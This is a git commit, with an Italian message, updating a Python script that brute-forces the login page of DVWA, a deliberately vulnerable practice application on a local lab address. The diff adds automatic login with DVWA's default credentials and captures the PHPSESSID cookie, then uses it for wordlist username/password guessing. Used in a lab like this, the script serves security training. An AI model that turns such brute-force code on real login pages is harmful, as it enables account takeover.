9f9e82d02ce0163440aa9360c991d0604bc92b3b
sedici-gith <149874494+sedici-gith@users.noreply.github.com>
2024-02-15 14:24:59 +0100

    Aggiornamento PHPSESSID
    Il codice è stato aggiornato e integrato con il BF sulla pagina principale di DVWA (inserendo direttamente le credenziali di accesso) in modo da ottenere il PHPSESSID necessario ad effettuare le prove di attacco BF nella pagina interna di sicurezza dedicata di DVWA, non dovendo così più inserire manualmente il token del PHPSESSID

--- Python_Brute_Force/brute_force_DVWA_brute_page.py
+++ Python_Brute_Force/brute_force_DVWA_brute_page.py
@@ -6,6 +6,20 @@ lista_password = open("passwords.lst")
 user = lista_username.readlines() 
 password = lista_password.readlines()
 
+post_parameters = urllib.parse.urlencode({'username': 'admin', 'password': 'password', 'Login':"Login"})
+headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml"}
+conn = http.client.HTTPConnection("192.168.50.101")
+conn.request("POST", "/dvwa/login.php", post_parameters, headers)
+response = conn.getresponse()
+response.read().decode()
+set_cookie_header = response.getheaders()
+dest_cookie = []
+for cookie in set_cookie_header:
+    if cookie[0] == 'Set-Cookie':
+        dest_cookie.append(cookie[1].split(";")[0])
+conn.close()
+#print(dest_cookie[0])
+
 for usr in user:      
     usr = usr.rstrip()
     for pwd in password:
@@ -19,10 +33,7 @@ for usr in user:
         url_dvwa_bf = '/dvwa/vulnerabilities/brute/'
         url_target = url_dvwa_bf + '?' + post_parameters
 
-        #print(url_target)
-
-        phpsessionid = '83a8e15db70a9930b37187d21ab84451'
-        headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml,application/xml", 'Cookie':f'PHPSESSID={phpsessionid}'}  
+        headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml,application/xml", 'Cookie':dest_cookie[0]}  
         conn.request("GET", url_target, post_parameters, headers) 
         response = conn.getresponse()
         page_content = response.read().decode()
